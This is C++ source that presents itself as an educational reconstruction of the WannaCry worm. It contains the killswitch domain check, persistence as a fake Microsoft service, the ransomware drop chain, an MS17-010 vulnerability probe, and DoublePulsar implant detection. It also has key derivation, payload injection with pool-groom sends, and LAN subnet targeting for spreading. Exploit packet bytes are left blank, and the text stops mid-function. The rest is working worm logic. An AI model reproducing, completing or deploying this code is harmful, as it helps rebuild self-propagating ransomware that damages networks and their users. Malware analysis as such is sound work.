// worm.cpp — the WannaCry network worm (mssecsvc.exe)
// Killswitch domain check, service persistence, payload-drop chain and the
// dual-lane MS17-010 spreader; the exploit wire bytes are inert reference
// data.
// Reconstructed from the 2017 WannaCry binary (educational).

#if !defined(WIN32_LEAN_AND_MEAN)
# define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <wincrypt.h>
#include <process.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#ifdef __MINGW32__              /* __p___argc() is MSVCRT-internal */
extern "C" int *__cdecl __p___argc(void);
#endif

/* forward decls (mutual recursion: killswitch -> dispatch -> service) */
static void dispatch_by_args(void);
static void WINAPI service_main(DWORD argc, LPSTR *argv);
static void init_exploit_packet_table(void);

/* =========================================================================
 * 0. Global state
 * ========================================================================= */

static char     g_own_path[261];            /* full path of this executable                   */
static HGLOBAL  g_dp_payload[2];            /* staged injection buffers: [0]=x86 [1]=x64      */
static LONG     g_live_attacks;             /* live LAN-lane attack threads (concurrency gate)*/
static HCRYPTPROV g_hprov;                  /* CryptoAPI RNG provider handle                  */
static CRITICAL_SECTION g_rng_cs;           /* serializes CryptGenRandom across threads       */
static SERVICE_STATUS_HANDLE g_ssh;         /* service status handle for SetServiceStatus     */
static SERVICE_STATUS g_sstat;              /* status block reported to the SCM               */
static char     g_empty_str[4];             /* "" used for failure-action messages            */

/* kernel32 APIs for the payload drop, resolved via GetProcAddress at runtime
 * (keeps them out of the static import table — anti-signature) */
static union { FARPROC proc; HANDLE (WINAPI *create_file)(LPCSTR, DWORD, DWORD,
                LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE); } g_fn_create_file;
static union { FARPROC proc; BOOL (WINAPI *write_file)(HANDLE, LPCVOID, DWORD,
                LPDWORD, LPOVERLAPPED); } g_fn_write_file;
static union { FARPROC proc; BOOL (WINAPI *close_handle)(HANDLE); } g_fn_close_handle;
static union { FARPROC proc; BOOL (WINAPI *create_process)(LPCSTR, LPSTR,
                LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD,
                LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION); } g_fn_create_process;

/* ---- Exploit wire data (inert reference). In the original binary these
 * SMB/EternalBlue/DoublePulsar templates are obfuscated in-binary blobs and
 * are intentionally NOT reproduced; init_exploit_packet_table fills them at
 * runtime. Sizes below are the byte-verified data layout. */
static BYTE g_pkt_negotiate[88];        /* 88 B: SMB Negotiate request                 */
static BYTE g_pkt_sesssetup[103];       /* 103 B: Session Setup AndX                   */
static BYTE g_pkt_treeconn[0x61];       /* 97 B: Tree Connect AndX                     */
static BYTE g_pkt_echo[78];             /* 78 B: Trans2 probe to \PIPE\                */
static BYTE g_pkt_sesssetup2[137];      /* 137 B: DoublePulsar session setup, first  */
static BYTE g_pkt_sesssetup3[140];      /* 140 B: DoublePulsar session setup, second */
static BYTE g_pkt_echo96[96];           /* 96 B: DoublePulsar session echo             */
static BYTE g_pkt_dp_ping[82];          /* 82 B: DoublePulsar Trans2 ping              */
static BYTE g_groom_hdr[70];            /* 70 B: groom/overflow SMB template           */
static BYTE g_staged_x86[0x1305];       /* 4869 B: obfuscated x86 kernel stage         */
static BYTE g_staged_x64[0x1800];       /* 6144 B: obfuscated x64 kernel stage         */
static BYTE g_dp_loader_x86[16800];     /* 16480 B: x86 DoublePulsar user-mode loader  */
static BYTE g_dp_loader_x64[51364];     /* 51364 B: x64 DoublePulsar user-mode loader  */

/* Patch sites inside the DoublePulsar templates (original-image VAs kept as
 * data-layout reference). At the three opcode sites the STATIC template bytes
 * are 0x41/0x01/0x34; the 0x42/0x0E/0x69 exec values are only ever written by
 * the dead-path patch in doublepulsar_ping, never present statically. */
enum {
    DP_ECHO_TID_LO   = 0x42e67c,        /* TreeID slot in the Echo template            */
    DP_PING_UID      = 0x42e6d8,        /* UID slot in the Trans2 ping template        */
    DP_PING_SC42     = 0x42e6de,        /* the three opcode bytes flipped from ping    */
    DP_PING_SC0E     = 0x42e6ed,        /*   to exec on the dead detect_only==0 path   */
    DP_PING_SC69     = 0x42e6ee,
};

static const char *KILLSWITCH_URL =
    "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";   /* the killswitch domain */

#define SERVICE_NAME     "mssecsvc2.0"  /* fixed name the network worm installs itself under */
#define SERVICE_DISPLAY  "Microsoft Security Center (2.0) Service" /* fake display name */
#define SERVICE_ARGS_FMT "%s -m security" /* SCM launch line: selects service mode    */
#define DROP_DIR         "WINDOWS"      /* payload lands in C:\WINDOWS               */
#define DROP_NAME        "tasksche.exe" /* dropped ransomware installer              */
#define DROP_ARGS        " /i"          /* installer argument: install mode          */
#define OLD_PAYLOAD_NAME "qeriuwjhrf"   /* junk name a previous tasksche.exe is moved to */
#define RESOURCE_ID      1831           /* embedded ransomware resource ID           */
#define RESOURCE_TYPE    "R"            /* custom resource type holding it           */

#define PORT_SMB      445               /* SMB port probed on every target           */
#define WORM_LIFETIME 86400000u         /* spreader lifetime in ServiceMain: 24 h    */
#define RANDOM_THREADS 128              /* random-internet-IP scanner threads        */
#define SUBNET_CONCURRENCY_MAX 10       /* max simultaneous LAN-lane attacks         */
#define ATTACK_ATTEMPTS 5               /* exploit rounds per victim                 */
#define RANDOM_IDX_OCTET_LIMIT 32       /* only thread indices < 32 re-roll octets a/b */
#define FIRST_OCTET_MAX 224             /* first octet: != 127 (loopback), < 224     */
#define GROOM_CHUNK     4096            /* bytes per non-paged-pool groom page       */
#define GROOM_SEND_LEN  4178            /* 70-B SMB hdr + 12-B keyed block + 4096 chunk */

/* ws2_32 is imported BY ORDINAL in the binary (3=closesocket, 4=connect,
 * 8=htonl, 9=htons, 10=ioctlsocket, 11=inet_addr, 12=inet_ntoa, 14=ntohl,
 * 16=recv, 18=select, 19=send, 23=socket, 115=WSAStartup) — names here are
 * usage-resolved. We just use the named APIs. */

/* =========================================================================
 * 1. Small primitives
 * ========================================================================= */

/* In-place rolling XOR: byte i of the data is XORed with key_byte[i % 4]
 * of the little-endian 4-byte key. */
static void xor_decode(DWORD key, void *data, int len)
{
    BYTE  kb[4];
    BYTE *p = (BYTE *)data;
    int   i;

    memcpy(kb, &key, 4);                 /* split the key dword into 4 bytes */
    for (i = 0; i < len; i++)
        p[i] ^= kb[i & 3];
}

/* DoublePulsar session-key derivation. The Trans2 ping reply leaks a kernel
 * dword x; the XOR key for everything that follows is the byte-reversed
 * value XORed with x doubled: key = bswap(x) ^ (2 * x). */
static DWORD dp_key_transform(DWORD x)
{
    return _byteswap_ulong(x) ^ (x * 2u);
}

/* Architecture selector from the ping reply: returns 1 (use the x86 payload
 * set) iff the second reply dword is zero; anything else selects x64. */
static int dp_arch_validate(DWORD a, DWORD b)
{
    return (b == 0) ? 1 : 0;
}

/* Microsecond-precision delay: the whole seconds via Sleep, then the
 * sub-10 ms remainder via a QueryPerformanceCounter busy-wait. */
static void precise_sleep(unsigned __int64 usec)
{
    unsigned __int64 sec  = usec / 1000000ULL;
    unsigned __int64 frac = (usec % 1000000ULL) * 1000ULL;   /* -> ns in a double */
    LARGE_INTEGER f, t0;
    double target;

    if (sec > 0) {
        Sleep((DWORD)(sec * 1000ULL + frac / 1000000ULL));
        return;
    }
    if (QueryPerformanceFrequency(&f)) {
        static double freq_ns;        /* cached ns-per-QPC-tick */
        if (freq_ns == 0.0)
            freq_ns = 1e9 / (double)f.QuadPart;
        target = (double)frac / freq_ns;
        QueryPerformanceCounter(&t0);
        if ((int)(frac / 1000000ULL) - 10 > 0)
            Sleep((DWORD)(frac / 1000000ULL) - 10);
        for (;;) {
            LARGE_INTEGER now;
            QueryPerformanceCounter(&now);
            if ((double)(now.QuadPart - t0.QuadPart) * freq_ns >= target)
                break;
        }
    }
}

/* Substring search over the first `limit` bytes; returns a pointer to the
 * match or NULL. */
static const char *find_in_packet(const char *buf, const char *needle, int limit)
{
    size_t nlen = strlen(needle);
    int    i;

    for (i = 0; i <= limit - (int)nlen; i++)
        if (memcmp(buf + i, needle, nlen) == 0)
            return buf + i;
    return NULL;
}

/* Replace the ASCII markers "__USERID__PLACEHOLDER__" /
 * "__TREEID__PLACEHOLDER__" in an SMB template with the live 2-byte values;
 * returns the new (shorter) packet length. */
static int patch_placeholders(const BYTE *pkt, int len, BYTE *out,
                              const BYTE *userid, const BYTE *treeid)
{
    static const char UID[] = "__USERID__PLACEHOLDER__";
    static const char TID[] = "__TREEID__PLACEHOLDER__";
    BYTE *w = out;
    int   rem = len, hit = 0;
    const BYTE *ph;
    int   off;

    ph = (const BYTE *)find_in_packet((const char *)pkt, UID, len);   /* order: UID first */
    if (ph) {
        off = (int)(ph - pkt);
        memcpy(w, pkt, off); w += off;
        *w++ = userid[0]; *w++ = userid[1];
        rem = len - off - (int)sizeof(UID) - 1;
        memcpy(w, ph + sizeof(UID) - 1, rem); w += rem;
        len = (len - (int)sizeof(UID) - 1) + 2;
        hit = 1;
    }
    ph = (const BYTE *)find_in_packet((const char *)(hit ? out : pkt), TID, len);
    if (ph) {
        off = (int)(ph - (hit ? out : pkt));
        if (!hit) { memcpy(out, pkt, off); w = out + off; }
        else      { w = out + off; }
        *w++ = treeid[0]; *w++ = treeid[1];
        rem = len - off - (int)sizeof(TID) - 1;
        memcpy(w, (hit ? out : pkt) + off + sizeof(TID) - 1, rem);
        len = (len - (int)sizeof(TID) - 1) + 2;
        hit = 1;
    }
    if (!hit)
        memcpy(out, pkt, len);
    return len;
}

/* =========================================================================
 * 2. SMB protocol layer (all templates are inert reference data)
 * ========================================================================= */

/* Tree Connect AndX to \\IP\IPC$ with the live UID and target path spliced
 * in; the NetBIOS length byte at packet+3 is set to total-4. Returns the
 * full packet length. */
static int build_tree_connect_ipc(const char *ip, const BYTE *uid)
{
    char path[96];                                   /* 96-byte stack buffer */
    sprintf(path, "\\\\%s\\IPC$", ip);

    int len = patch_placeholders(g_pkt_treeconn + 12, 0x55, g_pkt_treeconn + 12,
                                 uid, (const BYTE *)path);
    g_pkt_treeconn[3] = (BYTE)(len - 4);             /* NetBIOS length at byte 3 */
    return len + 12;
}

/* MS17-010 fingerprint probe. Runs the SMB handshake — Negotiate, Session
 * Setup (harvesting the live UID), Tree Connect to \\IP\IPC$, then a Trans2
 * probe — and flags the target vulnerable iff the final Trans2 reply carries
 * the tell-tale bytes 05 02 00 C0 at offsets 0x25..0x28. */
static int ms17_010_check(const char *ip, int port)
{
    SOCKET  s;
    SOCKADDR_IN sa;
    BYTE    rbuf[0x400];
    BYTE    uid[2];
    int     n, pkt;

    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons((u_short)port);
    sa.sin_addr.s_addr = inet_addr(ip);

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        return 0;
    if (connect(s, (SOCKADDR *)&sa, sizeof(sa)) == SOCKET_ERROR) {
        closesocket(s);
        return 0;
    }
    if (send(s, (char *)g_pkt_negotiate,  88, 0) == SOCKET_ERROR ||
        recv(s, (char *)rbuf, 0x400, 0) == SOCKET_ERROR ||
        send(s, (char *)g_pkt_sesssetup, 103, 0) == SOCKET_ERROR ||
        recv(s, (char *)rbuf, 0x400, 0) == SOCKET_ERROR) {
        closesocket(s);
        return 0;
    }
    uid[0] = rbuf[0x1c]; uid[1] = rbuf[0x1d];        /* harvested live UID     */

    pkt = build_tree_connect_ipc(ip, uid);
    if (send(s, (char *)g_pkt_treeconn, pkt, 0) == SOCKET_ERROR ||
        recv(s, (char *)rbuf, 0x400, 0) == SOCKET_ERROR) {
        closesocket(s);
        return 0;
    }
    /* splice the harvested reply bytes into the echo template
     * (data layout: template offsets 0x1c..0x23):
     *   [0x1c]=rbuf[0x1c] [0x1d]=rbuf[0x1d] [0x1e]=rbuf[0x1c] [0x1f]=rbuf[0x1d]
     *   [0x20]=0          [0x21]=rbuf[0x21] [0x22]=rbuf[0x22] [0x23]=rbuf[0x23] */
    g_pkt_echo[0x1c] = rbuf[0x1c];
    g_pkt_echo[0x1d] = rbuf[0x1d];
    g_pkt_echo[0x1e] = rbuf[0x1c];
    g_pkt_echo[0x1f] = rbuf[0x1d];
    g_pkt_echo[0x20] = 0;
    g_pkt_echo[0x21] = rbuf[0x21];
    g_pkt_echo[0x22] = rbuf[0x22];
    g_pkt_echo[0x23] = rbuf[0x23];
    if (send(s, (char *)g_pkt_echo, 78, 0) == SOCKET_ERROR ||
        recv(s, (char *)rbuf, 0x400, 0) == SOCKET_ERROR) {
        closesocket(s);
        return 0;
    }
    closesocket(s);
    if (rbuf[0x25] == 0x05 && rbuf[0x26] == 0x02 &&
        rbuf[0x27] == 0x00 && rbuf[0x28] == 0xC0)
        return 1;
    return 0;
}

/* DoublePulsar implant ping. Runs a full session — connect, session-setup
 * pair, echo, then the Trans2 ping — and reports the target implanted iff
 * the reply carries the 0x51 signature at offset 0x22. detect_only is 1 from
 * every live caller, so the exec-opcode patch branch below (0x42/0x0E/0x69
 * over the static 0x41/0x01/0x34 bytes) is dead code in this build. */
static int doublepulsar_ping(const char *ip, int detect_only, int port)
{
    SOCKET  s;
    SOCKADDR_IN sa;
    BYTE    rbuf[0x400];
    int     ok = 0;

    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons((u_short)port);
    sa.sin_addr.s_addr = inet_addr(ip);

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        return 0;
    if (connect(s, (SOCKADDR *)&sa, sizeof(sa)) != SOCKET_ERROR &&
        send(s, (char *)g_pkt_sesssetup2, 137, 0) != SOCKET_ERROR &&
        recv(s, (char *)rbuf, 0x400, 0) != SOCKET_ERROR &&
        send(s, (char *)g_pkt_sesssetup3, 140, 0) != SOCKET_ERROR &&
        recv(s, (char *)rbuf, 0x400, 0) != SOCKET_ERROR) {
        g_pkt_echo96[0x20] = 0;              /* splice reply byte 0x21 into  */
        g_pkt_echo96[0x21] = rbuf[0x21];     /* the session echo template    */
        if (send(s, (char *)g_pkt_echo96, 96, 0) != SOCKET_ERROR &&
            recv(s, (char *)rbuf, 0x400, 0) != SOCKET_ERROR) {
            g_pkt_dp_ping[0x1c] = rbuf[0x1c];/* splice reply UID bytes into  */
            g_pkt_dp_ping[0x1d] = rbuf[0x1d];/* the Trans2 ping template     */
            g_pkt_dp_ping[0x20] = 0;
            g_pkt_dp_ping[0x21] = rbuf[0x21];
            if (send(s, (char *)g_pkt_dp_ping, 82, 0) != SOCKET_ERROR &&
                recv(s, (char *)rbuf, 0x400, 0) != SOCKET_ERROR &&
                rbuf[0x22] == 0x51) {                 /* the 0x51 signature   */
                if (detect_only) {
                    ok = 1;
                } else {
                    /* dead path as built: flip the opcode bytes from ping to
                     * the exec values (0x42/0x0E/0x69) and re-send — this is
                     * what would order the implant to run the staged payload */
                    g_pkt_dp_ping[0x22] = 0x42;
                    g_pkt_dp_ping[0x31] = 0x0E;
                    g_pkt_dp_ping[0x32] = 0x69;
                    g_pkt_dp_ping[0x33] = 0;
                    g_pkt_dp_ping[0x34] = 0;
                    if (send(s, (char *)g_pkt_dp_ping, 82, 0) != SOCKET_ERROR &&
                        recv(s, (char *)rbuf, 0x400, 0) != SOCKET_ERROR)
                        ok = 1;
                }
            }
        }
    }
    closesocket(s);
    return ok;
}

/* Close every socket tracked by the EternalBlue race engine. The binary
 * walks a std::list of open sockets; a plain array stands in here. */
static SOCKET g_race_sockets[256];
static int    g_race_count;
static void close_tracked_sockets(void)
{
    int i;
    for (i = 0; i < g_race_count; i++)
        closesocket(g_race_sockets[i]);
}

/* EternalBlue transaction-race driver. In-binary this manages ~174
 * fixed-size slot records (state, socket, ~10 KB send buffer, per-slot
 * pacing delay) and interleaves several SMB transactions to groom the
 * non-paged pool before triggering the overflow. Slot states:
 * 2 = connect, 1 = recv (harvest "treeid"/"userid" echoes via
 * case-insensitive compare), 0 = patch placeholders + send, 3 = close.
 * Rounds are paced by GetTickCount and precise_sleep against each slot's
 * delay. All wire content comes from the inert template set built by
 * init_exploit_packet_table. This reconstruction keeps the pacing skeleton
 * only (delay stubbed to 0.0). */
static void eternalblue_race(const char *ip, int port)
{
    DWORD t0 = GetTickCount();
    int   slot;

    init_exploit_packet_table();                     /* (re)build the templates */

    for (slot = 0; 0x431480 + (slot + 1) * 0x2728 <= 0x5ffd08; slot++) {
        double delay = 0.0;   /* per-slot pacing delay (stub: 0.0) */
        DWORD  now   = GetTickCount();
        if (delay * 1000.0 - (double)(now - t0) > 0.0)
            precise_sleep((unsigned __int64)((delay * 1000.0 -
                          (double)(now - t0))) * 1000ULL);
        /* slot state machine as documented above; on any transport failure:
         * close all sockets, sleep 1 s, return. */
        (void)ip; (void)port;
    }
    close_tracked_sockets();
    Sleep(1000);
}

/* Fills every SMB/exploit template buffer above. In the original binary this
 * is ~4,600 lines of byte stores writing obfuscated EternalBlue/DoublePulsar
 * blobs into .data — inert reference data, intentionally NOT reproduced. One
 * human fingerprint survives in the data: the developer's VirtualBox host
 * \\192.168.56.20\IPC$ baked into the Tree Connect specials. */
static void init_exploit_packet_table(void)
{
    /* body elided: g_pkt_* / g_groom_hdr / g_staged_* template bytes */
}

/* =========================================================================
 * 3. DoublePulsar injection
 * ========================================================================= */

/* Build, key and send the DoublePulsar injection payload.
 *   Payload-set selection: arch_sel != 0 -> the x86 set (small DoublePulsar
 *   user-mode loader + x86 kernel stage); arch_sel == 0 -> the x64 set. One
 *   allocation is assembled as [kernel stage][DP loader + 4-byte size + this
 *   worm's own EXE image]. A few location fields in the stage template are
 *   patched first (payload base, payload size, flag = 1): x86 offsets
 *   +0x0591/+0x12FD/+0x1301, x64 offsets +0x086E/+0x11F8/+0x11FC. The whole
 *   allocation is then XORed with the negotiated session key.
 *   Every large send shares one wire shape: the 70-B SMB groom template,
 *   a 12-B keyed block at +0x46 (three dwords, XOR-decoded per send), and
 *   the payload chunk at +0x52. Groom pages (4096 B each, 0x1052-B sends)
 *   must each be acknowledged with 0x52 ('R'); the final overflow send
 *   carries the payload itself (NetBIOS length htons(size+0x4E)).
 * AS-BUILT: size_arg arrives aliased from inject_payload's mode argument
 * (=1), so ceil(1/4096) = 0 groom pages — the groom loop is skipped and the
 * final send is 83 B. Implemented exactly as the binary computes it. */
static void send_exploit_payload(SOCKET s, int arch_sel, DWORD key, DWORD size_arg)
{
    BYTE  *blob;
    int    blob_len;
    BYTE  *payload;
    DWORD  payload_len;
    BYTE  *alloc;
    DWORD  pages, i;
    BYTE   buf[GROOM_SEND_LEN + 16];
    DWORD  len_field, off;

    if (arch_sel != 0) {                 /* x86 set */
        payload     = (BYTE *)g_dp_payload[0];
        payload_len = 0x506000;
        blob        = g_staged_x86;
        blob_len    = 0x1305;
    } else {                             /* x64 set */
        payload     = (BYTE *)g_dp_payload[1];
        payload_len = 0x50d800;
        blob        = g_staged_x64;
        blob_len    = 0x1800;
    }

    alloc = (BYTE *)GlobalAlloc(GPTR, blob_len + payload_len + 12);
    if (!alloc)
        return;

    memcpy(alloc + blob_len, payload, payload_len);            /* [blob][DP] */
    /* location patches into the STATIC stage template before the copy
     * (payload base, payload size, flag — stage data layout):
     *   x86: +0x0591 = payload_len+0xD70, +0x12FD = payload_len, +0x1301 = 1
     *   x64: +0x086E = payload_len+0xF8A, +0x11F8 = payload_len, +0x11FC = 1 */
    if (arch_sel != 0) {
        *(DWORD *)(blob + 0x0591) = payload_len + 0xd70;
        *(DWORD *)(blob + 0x12fd) = payload_len;
        *(DWORD *)(blob + 0x1301) = 1;
    } else {
        *(DWORD *)(blob + 0x086e) = payload_len + 0xf8a;
        *(DWORD *)(blob + 0x11f8) = payload_len;
        *(DWORD *)(blob + 0x11fc) = 1;
    }
    memcpy(alloc, blob, blob_len);
    len_field = ((blob_len + payload_len) & 3)
                  ? (((blob_len + payload_len + 3) & ~3u) + 4)
                  : (blob_len + payload_len);
    xor_decode(key, alloc, (int)len_field);                    /* XOR the whole allocation */

    /* Every large send shares one wire shape:
     *   +0x00  70-B SMB groom template
     *   +0x46  12-B keyed block (dwords written, then XOR-decoded per send)
     *   +0x52  payload chunk (groom: 0x52+0x1000 = 0x1052; overflow: +size) */
    pages = (size_arg + GROOM_CHUNK - 1) / GROOM_CHUNK;        /* round up to pages */
    off   = 0;
    for (i = 0; i < pages; i++) {                              /* groom loop */
        int n;
        memcpy(buf, g_groom_hdr, 70);                          /* template   */
        *(DWORD *)(buf + 0x46) = len_field;                    /* block dwords */
        *(DWORD *)(buf + 0x4a) = GROOM_CHUNK;                  /*   0x1000   */
        *(DWORD *)(buf + 0x4e) = off;                          /*   page off */
        xor_decode(key, buf + 0x46, 12);                       /* XOR block  */
        memcpy(buf + 0x52, alloc + off + len_field, GROOM_CHUNK);
        if (send(s, (char *)buf, GROOM_SEND_LEN, 0) == SOCKET_ERROR)
            break;
        n = recv(s, (char *)buf, 0x1000, 0);
        if (n == SOCKET_ERROR || (n >= 1 && buf[0] != 0x52))
            break;        /* each groom page must be acked with 0x52 ('R')   */
        off += GROOM_CHUNK;
    }

    if ((int)size_arg > 0) {                                   /* final overflow send */
        int n = 0;
        memcpy(buf, g_groom_hdr, 70);
        *(u_short *)(buf + 0x02) = htons((u_short)(size_arg + 0x4e));
        *(u_short *)(buf + 0x33) = (u_short)size_arg;
        *(u_short *)(buf + 0x43) = (u_short)(size_arg + 0xd);
        *(u_short *)(buf + 0x47) = (u_short)size_arg;
        *(DWORD *)(buf + 0x46) = key;                          /* block dwords */
        *(DWORD *)(buf + 0x4a) = size_arg;
        *(DWORD *)(buf + 0x4e) = pages * GROOM_CHUNK;
        xor_decode(key, buf + 0x46, 12);
        memcpy(buf + 0x52, alloc + (pages ? off + len_field : 0), size_arg);
        if (send(s, (char *)buf, (int)(size_arg + 0x52), 0) != SOCKET_ERROR)
            n = recv(s, (char *)buf, 0x1000, 0);               /* unchecked  */
        (void)n;
    }
    GlobalFree(alloc);
}

/* Full DoublePulsar session against one target, then keyed payload
 * injection: connect, session-setup pair, echo, Trans2 ping (must answer
 * with the 0x51 signature). The ping reply leaks the key input (dword at
 * offset 0x0E, run through dp_key_transform) and the architecture input
 * (dword at offset 0x12, run through dp_arch_validate).
 * AS-BUILT quirk: the size argument handed to send_exploit_payload is read
 * from the caller's mode-argument stack slot, so `mode` (always 1) doubles
 * as the groom/overflow size. Kept verbatim. */
static void inject_payload(const char *ip, int mode, int port)
{
    SOCKET  s;
    SOCKADDR_IN sa;
    BYTE    rbuf[0x400];
    DWORD   sig1, sig2, key;
    int     arch_sel;

    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons((u_short)port);
    sa.sin_addr.s_addr = inet_addr(ip);

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        return;
    if (connect(s, (SOCKADDR *)&sa, sizeof(sa)) == SOCKET_ERROR ||
        send(s, (char *)g_pkt_sesssetup2, 137, 0) == SOCKET_ERROR ||
        recv(s, (char *)rbuf, 0x400, 0) == SOCKET_ERROR ||
        send(s, (char *)g_pkt_sesssetup3, 140, 0) == SOCKET_ERROR ||
        recv(s, (char *)rbuf, 0x400, 0) == SOCKET_ERROR) {
        closesocket(s);
        return;
    }
    g_pkt_echo96[0x20] = 0;                   /* splice reply byte 0x21 into */
    g_pkt_echo96[0x21] = rbuf[0x21];          /* the session echo template   */
    if (send(s, (char *)g_pkt_echo96, 96, 0) == SOCKET_ERROR ||
        recv(s, (char *)rbuf, 0x400, 0) == SOCKET_ERROR) {
        closesocket(s);
        return;
    }
    /* Copy the reply's UID/session bytes (offsets 0x1C, 0x1D, 0x20) into the
     * Trans2 ping template. A fourth byte came from uninitialized stack
     * residue in-binary and is kept as 0. */
    g_pkt_dp_ping[0x1c] = rbuf[0x1c];
    g_pkt_dp_ping[0x1d] = rbuf[0x1d];
    g_pkt_dp_ping[0x20] = rbuf[0x20];
    g_pkt_dp_ping[0x21] = 0;          /* stack residue in-binary, kept 0 */
    if (send(s, (char *)g_pkt_dp_ping, 82, 0) == SOCKET_ERROR ||
        recv(s, (char *)rbuf, 0x400, 0) == SOCKET_ERROR ||
        rbuf[0x22] != 0x51) {
        closesocket(s);
        return;
    }
    /* key input  = reply dword at offset 0x0E (dp_key_transform);
     * arch input = reply dword at offset 0x12 (dp_arch_validate) */
    memcpy(&sig1, rbuf + 0x0e, 4);
    memcpy(&sig2, rbuf + 0x12, 4);
    arch_sel = dp_arch_validate(sig1, sig2);          /* sig2 == 0 -> x86   */
    key      = dp_key_transform(sig1);
    send_exploit_payload(s, arch_sel, key, (DWORD)mode);
    closesocket(s);
}

/* =========================================================================
 * 4. Target acquisition
 * ========================================================================= */

/* Non-blocking 445/TCP reachability probe with a 1 s select window. */
static int probe_445(DWORD ip)
{
    SOCKET       s;
    SOCKADDR_IN  sa;
    fd_set       wfds;
    TIMEVAL      tv = { 1, 0 };
    u_long       nb = 1;
    int          r;

    memset(&sa, 0, sizeof(sa));
    sa.sin_family      = AF_INET;
    sa.sin_port        = htons(PORT_SMB);
    sa.sin_addr.s_addr = ip;

    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        return 0;
    ioctlsocket(s, FIONBIO, &nb);
    connect(s, (SOCKADDR *)&sa, sizeof(sa));
    FD_ZERO(&wfds);
    FD_SET(s, &wfds);
    r = select(0, NULL, &wfds, NULL, &tv);
    closesocket(s);
    return r;                                        /* > 0 = port open      */
}

/* Cryptographically random 32-bit dword: CryptGenRandom under the RNG
 * critical section; rand() fallback if no provider was acquired. */
static int rng32(void)
{
    int out = 0;

    if (g_hprov == 0)
        return rand();
    EnterCriticalSection(&g_rng_cs);
    CryptGenRandom(g_hprov, 4, (BYTE *)&out);
    LeaveCriticalSection(&g_rng_cs);
    return out;
}

/* RFC1918 private-address filter; bounds checked in the network-byte-order
 * (htonl) address space. */
static int is_rfc1918(DWORD ip)
{
    DWORD n = htonl(ip);
    if (n > 0x09ffffffu && n < 0x0b000000u) return 1;   /* 10.0.0.0/8       */
    if (n > 0xac0fffffu && n < 0xac200000u) return 1;   /* 172.16.0.0/12    */
    if (n > 0xc0a7ffffu && n < 0xc0a90000u) return 1;   /* 192.168.0.0/16   */
    return 0;
}

/* Grow-by-doubling push for the /24 target list (std::vector in-binary;
 * simplified here). */
typedef struct { DWORD *d; int n, cap; } VEC;
static void vec_push(VEC *v, DWORD ip)
{
    if (v->n == v->cap) {
        int    cap = v->cap ? v->cap * 2 : 64;
        DWORD *d   = (DWORD *)LocalAlloc(LMEM_FIXED, cap * sizeof(DWORD));
        if (v->d) { memcpy(d, v->d, v->n * sizeof(DWORD)); LocalFree(v->d); }
        v->d = d; v->cap = cap;
    }
    v->d[v->n++] = ip;
}

/* Dedup helper: is this /24 base already on the list? */
static int ip_in_ranges(VEC *v, DWORD ip24)
{
    int i;
    for (i = 0; i < v->n; i++)
        if (v->d[i] == ip24)
            return 1;
    return 0;
}

/* Decompose the [net, wild] range into /24 bases, skipping .0 and .255
 * host addresses (byte-stepped over the network-order address space). */
static void split_into_24s(VEC *v, DWORD net, DWORD wild)
{
    DWORD a, lo = htonl(net), hi = htonl(wild);

    for (a = lo; a <= hi; a++) {
        if ((a & 0xff) == 0 || (a & 0xff) == 0xff)
            continue;
        vec_push(v, ntohl(a));
    }
}

/* Enumerate the host's own networks as a sorted, deduplicated /24 base list:
 * every /24 spanned by each adapter's IP/mask pair, the /24 base of each
 * gateway, and the /24 base of each RFC1918 DNS server (per-adapter info). */
static int build_local_subnet_targets(VEC *out24)
{
    ULONG              n = 0;
    IP_ADAPTER_INFO   *ai, *p;
    DWORD              ip, mask;

    if (GetAdaptersInfo(NULL, &n) != ERROR_BUFFER_OVERFLOW)
        return 0;
    ai = (IP_ADAPTER_INFO *)LocalAlloc(LMEM_FIXED, n);
    if (!ai || GetAdaptersInfo(ai, &n) != NO_ERROR) {
        LocalFree(ai);
        return 0;
    }
    for (p = ai; p; p = p->Next) {
        IP_ADDR_STRING *a;
        for (a = &p->IpAddressList; a; a = a->Next) {
            ip   = inet_addr(a->IpAddress.String);
            mask = inet_addr(a->IpMask.String);
            if (ip == INADDR_NONE || ip == 0 || mask == INADDR_NONE || mask == 0)
                continue;
            split_into_24s(out24, ip & mask, ip | ~mask);
        }
        /* gateway pass: /24 base of each gateway, dedup-checked, no
         * private-range filter here */
        for (a = &p->GatewayList; a; a = a->Next) {
            DWORD g = inet_addr(a->IpAddress.String);
            if (g == INADDR_NONE || g == 0)
                continue;
            if (!ip_in_ranges(out24, g & 0xffffff00u))
                vec_push(out24, g & 0xffffff00u);
        }
    }
    /* Per-adapter info pass: harvest the adapter's DNS server list, keeping
     * only RFC1918 addresses whose /24 is not already covered. */
    {
        ULONG pn = 0;
        IP_PER_ADAPTER_INFO *pi;
        for (p = ai; p; p = p->Next) {
            if (GetPerAdapterInfo(p->Index, NULL, &pn) != ERROR_BUFFER_OVERFLOW)
                continue;
            pi = (IP_PER_ADAPTER_INFO *)LocalAlloc(LMEM_FIXED, pn);
            if (!pi)
                continue;
            if (GetPerAdapterInfo(p->Index, pi, &pn) == NO_ERROR) {
                IP_ADDR_STRING *u;
                for (u = &pi->DnsServerList; u; u = u->Next) {
                    DWORD a = inet_addr(u->IpAddress.String);
                    if (a == INADDR_NONE || a == 0 || !is_rfc1918(a))
                        continue;
                    if (!ip_in_ranges(out24, a & 0xffffff00u))
                        vec_push(out24, a & 0xffffff00u);
                }
            }
            LocalFree(pi);
            pn = 0;
        }
    }
    LocalFree(ai);                                   /* adapter info freed   */
    /* sort + dedup */
    {
